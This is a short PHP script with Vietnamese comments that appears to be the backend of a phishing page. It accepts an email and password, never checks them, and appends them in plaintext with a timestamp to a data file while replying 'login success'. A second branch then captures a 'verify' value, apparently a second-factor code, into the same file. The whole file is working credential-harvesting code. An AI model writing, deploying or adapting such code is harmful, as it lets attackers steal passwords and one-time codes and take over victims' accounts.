<?php  session_start(); ?>
<?php
    include "config.php";
    
	$email = trim($_POST['email']);
    $pass = trim($_POST['pass']);
    $verify = trim($_POST['verify']);

    //Trang login
    if ($email !== '' && $pass !== '') {
        $_SESSION['email']=$email;
        $_SESSION['pass']=$pass;
    	$datafile = fopen(FILE_DATA, "a");
    	$info = "\n" . $email . '/' . $pass . "/" . date('Y-m-d H:i') . '/';
    	fwrite($datafile, $info);
    	fclose($datafile);
    	echo "login success";
    	exit();
    }

    //Xác nhận
    if ($verify !== '') {
        unset($_SESSION['email']);
        unset($_SESSION['pass']);
    	$datafile = fopen(FILE_DATA, "a");
    	$info = $verify;
    	fwrite($datafile, $info);
    	fclose($datafile);
    	echo "verify success";
    	exit();
    }